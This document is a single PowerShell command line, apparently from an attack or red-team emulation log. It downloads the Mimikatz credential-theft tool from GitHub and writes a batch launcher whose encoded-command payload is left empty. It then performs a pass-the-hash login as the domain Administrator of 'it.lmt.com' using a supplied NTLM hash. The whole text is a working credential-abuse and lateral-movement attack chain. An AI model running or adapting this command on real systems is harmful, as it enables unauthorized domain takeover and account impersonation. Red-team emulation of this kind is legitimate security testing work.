command: cd C:\Scripts;mkdir mimkatz;cd mimkatz;wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -o mim.zip;Expand-Archive .\mim.zip;$scriptContent = 'powershell -e ';$scriptContent | Out-File -FilePath "C:\Scripts\mimkatz\agent.bat" -Encoding ASCII;C:\Scripts\mimkatz\mim\x64\mimikatz.exe 'sekurlsa::pth /user:Administrator /domain:it.lmt.com /ntlm:3051f68feb2e6d9d8b9ee54260a54433 /run:"C:\Scripts\mimkatz\agent.bat"' exit;
